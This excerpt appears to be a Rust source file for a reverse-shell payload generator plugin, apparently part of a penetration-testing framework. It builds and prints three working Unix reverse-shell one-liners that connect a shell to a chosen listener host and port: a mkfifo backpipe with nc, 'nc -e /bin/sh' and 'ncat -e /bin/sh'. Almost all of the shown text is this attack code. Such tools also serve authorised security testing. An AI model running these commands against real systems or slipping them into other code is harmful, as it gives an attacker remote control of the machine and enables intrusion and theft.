//! Unix Netcat Reverse TCP Shell Payload Generator
//!
//! Creates an interactive shell via netcat using a named pipe (mkfifo).
...
static NAME: &str = "Unix Netcat Reverse TCP";
static DESCRIPTION: &str = "Reverse shell via netcat with mkfifo backpipe";
...
extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
    ...
    let payload = format!(
        "mkfifo /tmp/{bp}; nc {host} {port} 0</tmp/{bp} | /bin/sh >/tmp/{bp} 2>&1; rm /tmp/{bp}",
        bp = backpipe, host = lhost, port = lport
    );

    // Alternative using netcat -e (if available)
    let payload_nc_e = format!("nc -e /bin/sh {} {}", lhost, lport);

    // Alternative using ncat
    let payload_ncat = format!("ncat {} {} -e /bin/sh", lhost, lport);

    println!("\n[+] Netcat Reverse Shell Payload:");
    println!("    Target: {}:{}", lhost, lport);
    println!("    Backpipe: /tmp/{}\n", backpipe);

    println!("=== Option 1: Standard nc with mkfifo ===");
    println!("{}", payload);

    println!("\n=== Option 2: nc -e (traditional netcat) ===");
    println!("{}", payload_nc_e);
